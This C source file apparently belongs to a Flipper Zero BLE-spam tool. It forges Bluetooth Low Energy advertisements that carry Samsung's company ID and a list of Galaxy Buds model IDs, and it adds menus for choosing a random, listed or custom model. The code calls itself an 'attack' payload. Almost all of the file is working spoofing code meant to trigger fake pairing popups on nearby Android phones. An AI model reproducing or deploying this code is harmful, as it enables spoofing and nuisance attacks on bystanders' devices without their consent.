#include "smartthings.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Research by @Spooks4576

const struct {
    uint32_t value;
    const char* name;
} buds_models[] = {
    {0x39EA48, "Light Purple Buds"},    {0xA7C62C, "Bluish Silver Buds"},
    {0x850116, "Black Buds Live"},      {0x3D8F41, "Gray and Black Buds"},
    {0x3B6D02, "Bluish Chrome Buds"},   {0xAE063C, "Grey Beige Buds"},
    {0xB8B905, "Pure White Buds V2"},   {0xEAAA17, "Pure White Buds"},
    {0xD30704, "Black Buds V2"},        {0x101F1A, "Dark Purple Buds Live"},
    {0x9DB006, "French Flag Buds V2"},  {0x859608, "Dark Blue Buds V2"},
    {0x8E4503, "Pink Buds V2"},         {0x2C6740, "White and Black Buds"},
    {0x3F6718, "Bronze Buds Live"},     {0x42C519, "Red Buds Live"},
    {0xAE073A, "Black and White Buds"}, {0x011716, "Sleek Black Buds"},
    {0x9D1700, "Fallback Image"},       {0xEE7A0C, "Fallback Buds"},
};
const uint8_t buds_models_count = COUNT_OF(buds_models);

static const char* type_names[SmartthingsTypeMAX] = {
    [SmartthingsTypeBuds] = "SmartThings Buds",
};
static const char* smartthings_get_name(const ProtocolCfg* _cfg) {
    const SmartthingsCfg* cfg = &_cfg->smartthings;
    return type_names[cfg->type];
}

static uint8_t packet_sizes[SmartthingsTypeMAX] = {
    [SmartthingsTypeBuds] = 31,
};
void smartthings_make_packet(uint8_t* out_size, uint8_t** out_packet, const ProtocolCfg* _cfg) {
    const SmartthingsCfg* cfg = _cfg ? &_cfg->smartthings : NULL;

    SmartthingsType type;
    if(cfg) {
        type = cfg->type;
    } else {
        type = rand() % SmartthingsTypeMAX;
    }

    uint8_t size = packet_sizes[type];
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    switch(type) {
    case SmartthingsTypeBuds: {
        uint32_t model;
        if(cfg && cfg->data.buds.model != 0x000000) {
            model = cfg->data.buds.model;
        } else {
            model = buds_models[rand() % buds_models_count].value;
        }

        packet[i++] = 27; // Size
        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
        packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        packet[i++] = 0x00; // ...
        packet[i++] = 0x42;
        packet[i++] = 0x09;
        packet[i++] = 0x81;
        packet[i++] = 0x02;
        packet[i++] = 0x14;
        packet[i++] = 0x15;
        packet[i++] = 0x03;
        packet[i++] = 0x21;
        packet[i++] = 0x01;
        packet[i++] = 0x00;
        packet[i++] = (model >> 0x10) & 0xFF;
        packet[i++] = (model >> 0x08) & 0xFF;
        packet[i++] = 0x01;
        packet[i++] = (model >> 0x00) & 0xFF;
        packet[i++] = 0x06;
        packet[i++] = 0x3C;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;

        packet[i++] = 16; // Size
        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
        packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        // Truncated AD segment, Android seems to fill in the rest with zeros
        break;
    }
    default:
        break;
    }

    *out_size = size;
    *out_packet = packet;
}

enum {
    _ConfigBudsExtraStart = ConfigExtraStart,
    ConfigBudsModel,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(cfg->type) {
    case SmartthingsTypeBuds: {
        switch(index) {
        case ConfigBudsModel:
            scene_manager_next_scene(ctx->scene_manager, SceneSmartthingsBudsModel);
            break;
        default:
            break;
        }
        break;
    }
    default:
        break;
    }
}
static void buds_model_changed(VariableItem* item) {
    SmartthingsCfg* cfg = variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        cfg->data.buds.model = buds_models[index].value;
        variable_item_set_current_value_text(item, buds_models[index].name);
    } else {
        cfg->data.buds.model = 0x000000;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void smartthings_extra_config(Ctx* ctx) {
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    size_t value_index;

    switch(cfg->type) {
    case SmartthingsTypeBuds: {
        item =
            variable_item_list_add(list, "Model", buds_models_count + 1, buds_model_changed, cfg);
        const char* model_name = NULL;
        char model_name_buf[9];
        if(cfg->data.buds.model == 0x000000) {
            model_name = "Random";
            value_index = 0;
        } else {
            for(uint8_t i = 0; i < buds_models_count; i++) {
                if(cfg->data.buds.model == buds_models[i].value) {
                    model_name = buds_models[i].name;
                    value_index = i + 1;
                    break;
                }
            }
            if(!model_name) {
                snprintf(model_name_buf, sizeof(model_name_buf), "%06lX", cfg->data.buds.model);
                model_name = model_name_buf;
                value_index = buds_models_count + 1;
            }
        }
        variable_item_set_current_value_index(item, value_index);
        variable_item_set_current_value_text(item, model_name);
        break;
    }
    default:
        break;
    }

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

const Protocol protocol_smartthings = {
    .icon = &I_android,
    .get_name = smartthings_get_name,
    .make_packet = smartthings_make_packet,
    .extra_config = smartthings_extra_config,
};

static void buds_model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    switch(index) {
    case 0:
        cfg->data.buds.model = 0x000000;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case buds_models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneSmartthingsBudsModelCustom);
        break;
    default:
        cfg->data.buds.model = buds_models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_smartthings_buds_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    bool found = false;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, buds_model_callback, ctx);
    if(cfg->data.buds.model == 0x000000) {
        found = true;
        selected = 0;
    }
    for(uint8_t i = 0; i < buds_models_count; i++) {
        submenu_add_item(submenu, buds_models[i].name, i + 1, buds_model_callback, ctx);
        if(!found && cfg->data.buds.model == buds_models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", buds_models_count + 1, buds_model_callback, ctx);
    if(!found) {
        found = true;
        selected = buds_models_count + 1;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_smartthings_buds_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_smartthings_buds_model_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void buds_model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_smartthings_buds_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model");

    ctx->byte_store[0] = (cfg->data.buds.model >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->data.buds.model >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->data.buds.model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, buds_model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_smartthings_buds_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_smartthings_buds_model_custom_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    cfg->data.buds.model =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
}
